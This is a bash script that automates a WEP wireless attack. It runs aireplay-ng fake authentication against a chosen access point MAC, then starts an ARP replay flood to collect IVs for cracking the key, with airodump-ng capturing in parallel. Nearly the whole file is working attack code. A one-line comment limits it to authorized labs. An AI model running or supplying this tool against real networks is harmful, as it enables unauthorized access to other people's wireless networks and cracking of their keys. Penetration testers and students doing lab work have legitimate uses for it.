#!/usr/bin/env bash
# wep_traffic.sh
# Last Edited by Charles Duoto on November 16, 2026
# Generate traffic on a quiet WEP network: fake auth + ARP replay.
# Pure bash. Run airodump-ng in another terminal to capture IVs.
# Authorized lab environments only.
#
# Usage:
#   sudo ./wep_traffic.sh <monitor_interface> <ap_mac>
# Example:
#   sudo ./wep_traffic.sh wlan0 60:C3:97:F6:3E:BA

set -euo pipefail

if [[ $# -ne 2 ]]; then
    echo "Usage: $0 <monitor_interface> <ap_mac>"
    echo "Example: $0 wlan0 60:C3:97:F6:3E:BA"
    exit 1
fi

IFACE="$1"
AP_MAC="$2"

# Get our adapter MAC
OUR_MAC=""
if [[ -f "/sys/class/net/$IFACE/address" ]]; then
    OUR_MAC=$(cat "/sys/class/net/$IFACE/address" 2>/dev/null || true)
fi
if [[ -z "$OUR_MAC" ]]; then
    OUR_MAC=$(ip link show "$IFACE" 2>/dev/null | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1 || true)
fi
if [[ -z "$OUR_MAC" ]]; then
    OUR_MAC=$(ifconfig "$IFACE" 2>/dev/null | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1 || true)
fi
if [[ -z "$OUR_MAC" ]]; then
    echo "[-] Could not determine MAC of $IFACE"
    exit 1
fi

echo "[*] WEP traffic generator (fakeauth + arpreplay)"
echo "[*] Interface : $IFACE ($OUR_MAC)"
echo "[*] Target AP : $AP_MAC"
echo

echo "[*] Step 1: Fake authentication (associating)..."
echo "[*] This runs for ~10 seconds, then moves to ARP replay."
timeout 10 aireplay-ng --fakeauth 0 -a "$AP_MAC" -h "$OUR_MAC" "$IFACE" || true

echo
echo "[*] Step 2: ARP replay (amplifying traffic)..."
echo "[*] Press Ctrl+C to stop."
echo "[!] Leave airodump-ng running in another terminal to collect IVs."
aireplay-ng --arpreplay -b "$AP_MAC" -h "$OUR_MAC" "$IFACE"
